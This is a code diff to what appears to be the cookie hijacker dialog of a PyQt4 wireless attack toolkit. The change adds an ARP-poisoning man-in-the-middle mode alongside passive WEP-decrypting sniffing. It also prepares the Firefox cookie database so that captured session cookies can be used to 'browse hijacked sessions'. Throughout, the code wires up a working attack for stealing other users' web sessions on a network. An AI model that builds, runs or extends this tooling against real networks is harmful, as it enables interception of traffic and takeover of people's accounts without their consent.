@@ -7,6 +7,7 @@ import webbrowser
 
 from PyQt4 import QtCore,QtGui
 
+from MITM_Core import *
 from gui.cookie_hijacker import *
 from mozilla_cookie_core import *
 from cookie_hijacker_core import *
@@ -18,6 +19,10 @@ class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
         self.setupUi(self)
         self.retranslateUi(self)
 
+        self.sniff_button_control = "START"
+        self.interface_card_info = {}               # {eth0:ETHERNET, wlan0:WIFI}
+
+        self.enable_control(False)
         self.Right_click_Menu()                     # Activate right click menu items
         self.is_mozilla_cookie_truncated = False    # Deletes all previous cookies in mozilla database
 
@@ -30,20 +35,20 @@ class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
         self.clear_items()                          # Clear design items from cookie tree widget
         self.set_Window_Max()
 
-        self.groupBox_2.setVisible(False)           # Hide WEP / WPA settings group box
-
         self.host_interface = str()                 # Hold the name of the current monitor host interface e.g wlan0
 
         self.cookie_db_jar = object                             # Sqlite3 Database object
         self.cookie_core = Cookie_Hijack_Core()                 # Cookie Capture and processing core
+        self.mitm_core = Fern_MITM_Class.ARP_Poisoning()
         self.mozilla_cookie_engine = Mozilla_Cookie_Core()      # Mozilla fierfox cookie engine
 
         self.led_control = Led_Blick_Class()                    # Thread class for led blibking *
 
         self.connect(self.refresh_button,QtCore.SIGNAL("clicked()"),self.refresh_interface)
-        self.connect(self.show_option_button,QtCore.SIGNAL("clicked()"),self.show_settings)
         self.connect(self.start_sniffing_button,QtCore.SIGNAL("clicked()"),self.start_Cookie_Attack)
-        self.connect(self.combo_interface,QtCore.SIGNAL("currentIndexChanged(QString)"),self.set_monitor_mode)
+        self.connect(self.ethernet_mode_radio,QtCore.SIGNAL("clicked()"),self.set_attack_option)
+        self.connect(self.passive_mode_radio,QtCore.SIGNAL("clicked()"),self.set_attack_option)
+        self.connect(self.combo_interface,QtCore.SIGNAL("currentIndexChanged(QString)"),self.reset)
         self.connect(self,QtCore.SIGNAL("triggered()"),QtCore.SLOT("close()"))
 
         self.connect_objects()
@@ -51,6 +56,8 @@ class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
 
 
     def connect_objects(self):
+        self.connect(self,QtCore.SIGNAL("creating cache"),self.creating_cache)
+        self.connect(self,QtCore.SIGNAL("finished creating cache"),self.finished_creating_cache)
         self.connect(self.cookie_core,QtCore.SIGNAL("New Cookie Captured"),self.display_cookie_captured)    # Notification Signal for GUI instance"))
         self.connect(self.cookie_core,QtCore.SIGNAL("cookie buffer detected"),self.emit_led_buffer)         # Notification on new http packet
         self.connect(self,QtCore.SIGNAL("emit buffer red light"),self.emit_buffer_red_light)
@@ -61,15 +68,50 @@ class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
 
 
 
-    def show_settings(self):
-        status = bool(self.groupBox_2.isVisible())  # Hide or show settings
-        if(status == True):
-            self.groupBox_2.setVisible(False)
-            self.show_option_button.setText(" Show Settings ")
-        else:
-            self.groupBox_2.setVisible(True)
-            self.show_option_button.setText(" Hide Settings ")
+    def reset(self):
+        selected_card = str(self.combo_interface.currentText())
+        if(selected_card == "Select Interface Card"):
+            self.ethernet_mode_radio.setChecked(True)
+            self.label.setText("Gateway IP Address / Router IP Address:")
+            self.enable_control(False)
+            return
 
+        self.enable_control(True)
+        if(self.interface_card_info.has_key(selected_card)):
+            if(self.interface_card_info[selected_card] != "WIFI"):
+                self.ethernet_mode_radio.setChecked(True)
+                self.label.setText("Gateway IP Address / Router IP Address:")
+
+
+    def enable_control(self,status):
+        self.groupBox_2.setEnabled(status)
+        self.passive_mode_radio.setEnabled(status)
+        self.ethernet_mode_radio.setEnabled(status)
+        self.start_sniffing_button.setEnabled(status)
+
+
+    def set_attack_option(self,reset = False):
+        selected_card = str(self.combo_interface.currentText())
+        if(selected_card == "Select Interface Card"):
+            QtGui.QMessageBox.warning(self,"Interface Option","Please select a valid interface card from the list of available interfaces")
+            self.ethernet_mode_radio.setChecked(True)
+            return
+
+        if(self.ethernet_mode_radio.isChecked()):
+            self.monitor_interface_label.setText("Ethernet Mode")
+            self.label.setText("Gateway IP Address / Router IP Address:")
+        else:
+            if(self.interface_card_info[selected_card] == "ETHERNET"):
+                QtGui.QMessageBox.warning(self,"Interface Option","The selected mode only works with WIFI enabled interface cards")
+                self.ethernet_mode_radio.setChecked(True)
+                return
+            if(self.interface_card_info[selected_card] == "WIFI"):
+                if(self.passive_mode_radio.isChecked()):
+                    self.monitor_interface_label.setText("Monitor Mode")
+                    self.label.setText("WEP Decryption Key:")
+                else:
+                    self.monitor_interface_label.setText("Ethernet Mode")
+                    self.label.setText("Gateway IP Address / Router IP Address:")
 
 
     def set_Window_Max(self):
@@ -94,6 +136,7 @@ class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
 
     def refresh_interface(self):
         interface_cards = []
+        self.interface_card_info = {}
         self.combo_interface.clear()
         self.host_interface = str()
         interfaces = commands.getoutput("iwconfig").splitlines()
@@ -107,19 +150,24 @@ class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
         for card in sys_interface_cards:
             if(card.startswith("mon")):
                 continue
+            if(card == "lo"):               # Loopback interface
+                continue
+
             for card_info in interfaces:
                 if((card in card_info) and ("802.11" in card_info)):
                     interface_cards.append(card)
+                    self.interface_card_info[card] = "WIFI"
+
+            if(card not in interface_cards):
+                interface_cards.append(card)
+                self.interface_card_info[card] = "ETHERNET"
 
         if(len(interface_cards) >= 1):
-            interface_cards.insert(0,"Select Wireless Interface")
+            interface_cards.insert(0,"Select Interface Card")
             interface_cards.sort()
-            self.start_sniffing_button.setEnabled(True)
         else:
-            self.start_sniffing_button.setEnabled(False)
-            self.display_error("No wireless interface detected")
+            self.display_error("No Usable interface detected")
         self.combo_interface.addItems(interface_cards)
-
 
     ###
     def on_sniff_green_light(self):
@@ -134,7 +182,7 @@ class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
     def set_monitor_mode(self):
         selected_interface = str(self.combo_interface.currentText())
         self.cookies_captured_label.clear()
-        if((selected_interface == "Select Wireless Interface") or (selected_interface == str())):
+        if((selected_interface == "Select Interface Card") or (selected_interface == str())):
             self.clear_items()
             return
         else:
@@ -361,25 +409,89 @@ class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
         self.treeWidget.collapseAll()
         self.cookies_captured_label.setText("<font color=green><b>" + str(self.cookie_core.captured_cookie_count) + " Cookies Captured</b></font>")
 
-
     def prepare_Mozilla_Database(self):
+        sql_code_a = "select value from cache_settings where setting = 'cookie_path'"
+        sql_code_b = "select value from cache_settings where setting = 'library_path'"
+        sql_code_c = "insert into cache_settings values ('%s','%s')"
         if(self.firefox_is_installed()):
             if not self.mozilla_cookie_engine.cookie_database:
-                self.mozilla_cookie_engine.get_Cookie_Path("cookies.sqlite")
+
+                database_path = os.getcwd() + "/key-database/Cookie.db"
+                cookie_db_jar = sqlite3.connect(database_path)
+                cookie_db_cursor = cookie_db_jar.cursor()
+
+                cookie_db_cursor.execute(sql_code_a)
+                result = cookie_db_cursor.fetchone()
+                if(result):
+                    self.mozilla_cookie_engine.cookie_database = result[0]
+                else:
+                    self.emit(QtCore.SIGNAL("creating cache"))
+                    path = self.mozilla_cookie_engine.get_Cookie_Path("cookies.sqlite")
+                    if not path:
+                        raise Exception("cookies.sqlite3 firefox database has not been created on this system, Please run firefox to create")
+                    cookie_db_cursor.execute(sql_code_c % ("cookie_path",path))
+                    cookie_db_jar.commit()
+
+                cookie_db_cursor.execute(sql_code_b)
+                result = cookie_db_cursor.fetchone()
+                if(result):
+                    self.mozilla_cookie_engine.mozilla_install_path = result[0]
+                else:
+                    self.emit(QtCore.SIGNAL("creating cache"))
+                    path = self.mozilla_cookie_engine.find_mozilla_lib_path()
+                    cookie_db_cursor.execute(sql_code_c % ("library_path",path))
+                    cookie_db_jar.commit()
+
+                cookie_db_jar.close()
+
+            self.emit(QtCore.SIGNAL("finished creating cache"))
             self.mozilla_cookie_engine.execute_query("delete from moz_cookies")
+
+
+    def creating_cache(self):
+        self.start_sniffing_button.setEnabled(False)
+        self.cookies_captured_label.setText("<font color=green>Please wait caching objects...</font>")
+
+
+    def finished_creating_cache(self):
+        self.start_sniffing_button.setEnabled(True)
+        self.cookies_captured_label.clear()
+        self.start_Attack()                                                                             # ATTACK CONTINUES HERE <---
+
 
 
     # Attack starts here on button click()
     def start_Cookie_Attack(self):
-        self.cookies_captured_label.clear()
-
-        if(self.monitor_interface == str()):
-            self.display_error("Please enable monitor interface from any detected wireless interfaces")
+        if(self.sniff_button_control == "STOP"):
+            self.stop_Cookie_Attack()
             return
 
-        if not self.firefox_is_installed():
-            QtGui.QMessageBox.warning(self,"Mozilla Firefox Detection",
-            "Mozilla firefox is currently not installed on this computer, you need firefox to browse hijacked sessions, Process will capture cookies for manual analysis")
+        self.sniff_button_control = "STOP"
+        selected_interface = str(self.combo_interface.currentText())
+        self.cookies_captured_label.clear()
+        ip_wep_edit = str(self.wep_key_edit.text())
+
+        if(self.passive_mode_radio.isChecked()):
+            self.set_monitor_mode()
+            self.cookie_core.decryption_key = ip_wep_edit                # Pipes key (WEP) into cookie process API for processing encrypted frames
+            self.mitm_activated_label.setEnabled(False)
+            self.mitm_activated_label.setText("Internal MITM Engine Activated")
+
+        if(self.ethernet_mode_radio.isChecked()):
+            if(not re.match("(\d+.){3}\d+",ip_wep_edit)):
+                QtGui.QMessageBox.warning(self,"Invalid IP Address","Please insert a valid IPv4 Address of the Default Gateway")
+                self.wep_key_edit.setFocus()
+                return
+
+            self.monitor_interface_led.setPixmap(self.green_light)
+            self.mitm_core.interface_card = selected_interface
+            self.mitm_core.gateway_IP_address = ip_wep_edit             # Gateway Address
+            self.mitm_core.set_Attack_Option("ARP POISON + ROUTE")
+            self.mitm_core.start()
+            self.mitm_activated_label.setEnabled(True)
+            self.mitm_activated_label.setText("<font color = green><b>Internal MITM Engine Activated</b></font>")
+
+            self.monitor_interface = selected_interface
 
         try:
             database_path = os.getcwd() + "/key-database/Cookie.db"
@@ -391,18 +503,24 @@ class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
             self.display_error("Failed to create cookie database: " + str(message))
             return
 
+        thread.start_new_thread(self.prepare_Mozilla_Database,())       # Trucates and prepares database
+
+
+
+
+    def start_Attack(self):
+        if not self.firefox_is_installed():
+            QtGui.QMessageBox.warning(self,"Mozilla Firefox Detection",
+            "Mozilla firefox is currently not installed on this computer, you need firefox to browse hijacked sessions, Process will capture cookies for manual analysis")
 
         self.treeWidget.clear()
         self.connect_objects()
         self.wep_key_edit.setEnabled(False)                             # Lock WEP/WPA LineEdit
-        decryption_key = str(self.wep_key_edit.text())                  # Holds decryption key by user WEP/WPA
 
         self.cookie_core.control = True                                 # Start Core Thread processes
-        self.cookie_core.decryption_key = decryption_key                # Pipes key into cookie process API for processing encrypted frames
         self.cookie_core.monitor_interface = self.monitor_interface     # Holds the monitor interface e.g mon0,mon1
 
         self.led_control.start()                                        # Blinks Sniff Led for some number of seconds
-        self.prepare_Mozilla_Database()                                 # Trucates and prepares database
         self.start_sniffing_button.setEnabled(False)
 
 
@@ -413,28 +531,40 @@ class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
             self.sniffing_status_led.setPixmap(self.green_light)
             self.start_sniffing_button.setEnabled(True)
             self.start_sniffing_button.setText("Stop Sniffing")
-
-            self.disconnect(self.start_sniffing_button,QtCore.SIGNAL("clicked()"),self.start_Cookie_Attack)
-            self.connect(self.start_sniffing_button,QtCore.SIGNAL("clicked()"),self.stop_Cookie_Attack)
+            self.ethernet_mode_radio.setEnabled(False)
+            self.passive_mode_radio.setEnabled(False)
 
         except Exception,message:
             self.display_error(str(message))
             self.sniffing_status_led.setPixmap(self.red_light)
             self.cookie_detection_led.setPixmap(self.red_light)
+            self.ethernet_mode_radio.setEnabled(True)
+            self.passive_mode_radio.setEnabled(True)
 
 
 
     def stop_Cookie_Attack(self):
+        self.sniff_button_control = "START"
+        if(self.ethernet_mode_radio.isChecked()):
+            self.mitm_activated_label.setEnabled(False)
+            self.mitm_activated_label.setText("Internal MITM Engine Activated")
+            self.mitm_core.control = False
+
+            self.mitm_core._Thread__stop()
+            self.mitm_core = Fern_MITM_Class.ARP_Poisoning()
+
         self.cookie_core.control = False
 
-        self.cookie_core.terminate()                                    # Kill QtCore.QThread
-        self.led_control.terminate()
+        if(self.cookie_core.isRunning()):
+            self.cookie_core.terminate()                                    # Kill QtCore.QThread
+
+        if(self.led_control.isRunning()):
+            self.led_control.terminate()
 
         self.wep_key_edit.setEnabled(True)                              # Release WEP/WPA Decryption LineEdit
         self.start_sniffing_button.setText("Start Sniffing")
-
-        self.disconnect(self.start_sniffing_button,QtCore.SIGNAL("clicked()"),self.stop_Cookie_Attack)
-        self.connect(self.start_sniffing_button,QtCore.SIGNAL("clicked()"),self.start_Cookie_Attack)
+        self.ethernet_mode_radio.setEnabled(True)
+        self.passive_mode_radio.setEnabled(True)
 
         self.cookie_core = Cookie_Hijack_Core()
         self.sniffing_status_led.setPixmap(self.red_light)
@@ -443,7 +573,6 @@ class Fern_Cookie_Hijacker(QtGui.QDialog,Ui_cookie_hijacker):
 
     def clear_items(self):
         self.treeWidget.clear()
-        self.set_key_button.setVisible(False)
         self.cookies_captured_label.clear()
         self.cookie_detection_label.setEnabled(True)
         self.sniffing_status_label.setEnabled(True)
